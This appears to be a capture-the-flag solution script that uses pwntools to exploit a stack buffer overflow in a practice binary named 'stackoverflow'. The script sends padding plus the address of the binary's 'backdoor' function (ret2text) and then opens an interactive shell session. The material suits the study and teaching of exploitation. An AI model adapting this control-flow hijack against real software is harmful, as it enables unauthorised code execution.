from pwn import *

io = process("./stackoverflow")
#io = remote("xxx.xx.xxx.xx", xxxx)
elf = ELF("./stackoverflow")

io.sendlineafter(b"Do you know stack overflow and ret2text?",\
        b'a' * 0x30 + p64(0xdeadbeef) + p64(elf.symbols["backdoor"]))

io.interactive()
